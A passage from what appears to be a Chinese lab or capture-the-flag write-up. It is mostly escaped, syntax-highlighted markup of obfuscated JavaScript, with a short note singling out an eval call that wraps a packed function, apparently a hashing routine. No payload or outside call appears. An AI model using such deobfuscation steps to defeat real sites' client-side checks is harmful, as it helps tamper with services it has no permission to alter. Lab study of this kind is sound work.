&lt;span class="k">return&lt;/span> &lt;span class="nx">d&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x7&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mh">0x3e&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x137&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x8&amp;#39;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x9&amp;#39;&lt;/span>&lt;span class="p">)](&lt;/span>&lt;span class="s1">&amp;#39;|&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{}));&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="high解题">High：解题&lt;/h3>
&lt;p>前面的立即函数和 &lt;code>b&lt;/code> 分析后认为价值不大。后面的&lt;code>eval&lt;/code>引起注意。&lt;code>eval&lt;/code>里是一个立即函数，首参数 &lt;code>a[0x7]&lt;/code>内容如下。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x273M&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x203L&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201l&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x273K&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x203I&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x203J&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20T&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201R&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202I&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271n&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20Y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="p">{};&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202L&lt;/span>&lt;span class="o">=!&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202M&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271n&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202o&lt;/span>&lt;span class="o">=!&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202d&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271n&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202G&lt;/span>&lt;span class="o">=!&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202g&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271n&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202l&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27w&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201y&lt;/span>&lt;span class="o">=!&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20Z&lt;/span>&lt;span class="o">!==&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x272T&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20m&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x273G&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202w&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20U&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20K&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">40&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">46&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">45&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">43&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">42&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">38&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">36&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">39&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">37&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">34&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">33&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">35&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201E&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271e&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x2727&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271G&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x272R&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20l&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[];&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="o">||!&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x204C&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201z&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">}}&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="o">||!&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201x&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271n&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">}}&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202m&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">]()}};&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20P&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271e&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">)};&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20P&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)};&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20T&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20P&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202P&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201S&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x222N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271S&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201Y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x222N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271w&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202n&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271H&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202z&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span 